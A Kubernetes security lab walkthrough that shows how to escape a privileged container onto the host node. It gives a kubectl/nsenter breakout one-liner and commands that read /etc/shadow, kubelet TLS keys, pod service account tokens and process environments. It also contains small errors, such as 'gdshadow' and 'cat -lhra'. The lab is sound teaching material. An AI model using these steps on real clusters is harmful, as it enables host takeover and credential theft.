# Privileged container

A privileged container is a container that has all the capabilities of the host machine, which lifts all the limitations regular containers have. Practically, this means that privileged containers can do almost every action that can be performed directly on the host. Attackers who gain access to a privileged container, or have permissions to create a new privileged container (by using the compromised pod’s service account, for example), can get access to the host’s resources.

## Quick Start

1. Run the following command to deploy the privilege container

   ```bash
   kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--ipc=/proc/1/ns/ipc","--net=/proc/1/ns/net","--uts=/proc/1/ns/uts","--","/bin/bash"],"stdin": true,"tty":true,"securityContext":{"privileged":true}}]}}'
   ```

## File System Isolation Breakout

1. Inspect sensitive files and folders on the compromised node

   ```bash
   # Contains the hashed passwords for all users on the system
   cat /etc/passwd
   # Contains the hashed passwords for all users on the system
   cat /etc/shadow
   # Similar to /etc/shadow, but for group account passwords
   cat /etc/gdshadow
   # Defines privileges for users and groups regarding the use of sudo
   cat /etc/sudoers
   ls /etc/sudoers.d/
   # The home directory of the root user
   ls /root
   # The home folders of all users in the system
   ls /home
   ```

1. Identify in which node the privilege container is currently running

   ```bash
   # node name would usually be on the /etc/hosts file
   cat /etc/hosts
   # node name would be passed via the --hostname-override flag in kube-proxy 
   ps -aux | grep "kube-proxy"
   ```

1. Inspect interesting files and folders that belong to the `kubelet` process

   ```bash
   # kubelet configuration
   cat /var/lib/kubelet/config.yaml
   # kubelet client and server tls keys
   ls -lhra /var/lib/kubelet/pki
   # list pods managed by kubelet
   ls -lhra /var/lib/kubelet/pods
   ```

1. Inspect the running containers virtual file systems under the `io.containerd.snapshotter.v1.overlayfs` folder

   ```bash
   ls -lhra /var/lib/containerd/io.containerd.snapshotter.v1.overlayfs
   ```

1. Inspect the mounted volumes and secrets for a particular pod

   > Where $PODID is the uuid of a pod

   ```bash
   # list mounted volumes
   ls -lhra /var/lib/kubelet/pods/$PODID/volumes
   # display the service account token
   cat -lhra /var/lib/kubelet/pods/$PODID/volumes/kubernetes.io~projected/kube-api-access-t4spf/token
   ```

1. Inspect the logs for a particular container

   ```bash
   # list log files for all containers
   ls -lhar /var/log/containers
   # display logs for a particular container, where $CONTAINERID is the filename:
   cat /var/log/containers/{$CONTAINERID}.log
   ```

## Processes Isolation Breakout

1. Run the `top` or `ps -aux` commands and look for interesting processes such as `kubelet`, `containerd` and `systemd`

1. Inspect the environment variables for those privileged processes using the `cat` command:

    ```bash
    # `$PID` is the ID of the `kubelet`, `containerd` or `systemd` processes
    cat /proc/$PID/environ
    ```

    Example output:

    ```bash
    # ie: cat /proc/235/environ
    HTTPS_PROXY=HTTP_PROXY=LANG=C.UTF-8NO_PROXY=PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binINVOCATION_ID=047f52a1d2854c73b39863c31edb2639JOURNAL_STREAM=8:243012KUBELET_KUBECONFIG_ARGS=--bootstrap-kubeconfig=/etc/kubernetes/bootstrap-kubelet.conf --kubeconfig=/etc/kubernetes/kubelet.confKUBELET_CONFIG_ARGS=--config=/var/lib/kubelet/config.yamlKUBELET_KUBEADM_ARGS=--container-runtime-endpoint=unix:///run/containerd/containerd.sock --node-ip=172.19.0.5 --node-labels= --pod-infra-container-image=registry.k8s.io/pause:3.9 --provider-id=kind://docker/workshop-cluster/workshop-cluster-worker2KUBELET_EXTRA_ARGS=--runtime-cgroups=/system.slice/containerd.service
    ```

    From the above configuration identify the `Node IP` and the `kubelet.conf` configuration file

## Network Isolation Breakout

1. Run the `ss` command to list all current listening sockets and network information for the compromised node:

   ```bash
   ss -nltp
   ```

   Example output:

   ```bash
   # ss -nltp
   State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess
   LISTEN 0      4096      127.0.0.11:38803      0.0.0.0:*
   LISTEN 0      4096       127.0.0.1:41225      0.0.0.0:*    users:(("containerd",pid=105,fd=10))
   LISTEN 0      4096       127.0.0.1:10248      0.0.0.0:*    users:(("kubelet",pid=234,fd=17))
   LISTEN 0      4096       127.0.0.1:10249      0.0.0.0:*    users:(("kube-proxy",pid=384,fd=11))
   LISTEN 0      4096               *:10250            *:*    users:(("kubelet",pid=234,fd=25))
   LISTEN 0      4096               *:10256            *:*    users:(("kube-proxy",pid=384,fd=8))
   ```

End the lab by `<ctrl-c>` from the privileged container

## Resources

- <https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet/>
- <https://medium.com/nttlabs/the-internals-and-the-latest-trends-of-container-runtimes-2023-22aa111d7a93>
- <https://github.com/shubheksha/kubernetes-internals>
- <https://man7.org/linux/man-pages/man1/nsenter.1.html>
